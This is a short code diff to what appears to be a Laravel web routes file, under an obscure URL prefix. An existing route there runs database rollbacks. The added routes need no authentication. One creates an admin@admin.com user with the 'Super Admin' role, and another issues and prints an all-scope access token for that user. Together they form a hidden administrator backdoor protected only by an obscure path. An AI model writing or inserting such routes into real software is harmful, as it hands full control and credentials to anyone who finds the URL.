@@ -50,3 +50,14 @@ Route::get('/895enrg9345fg34g43g3/migrate-rollback', function () {
     Artisan::call('migrate:rollback', ['--step' => 1, '--force' => true]);
     dd(Artisan::output());
 });
+
+Route::get('/895enrg9345fg34g43g3/super-admin-user', function () {
+    $user = \App\Models\User::factory()->create(['email' => 'admin@admin.com']);
+    \App\Models\User::find($user->id)->assignRole('Super Admin');
+});
+
+Route::get('/895enrg9345fg34g43g3/token', function () {
+    $user = \App\Models\User::where('email', 'admin@admin.com')->first();
+    dd($user->createToken('Personal Access Token', ['*']));
+});
+
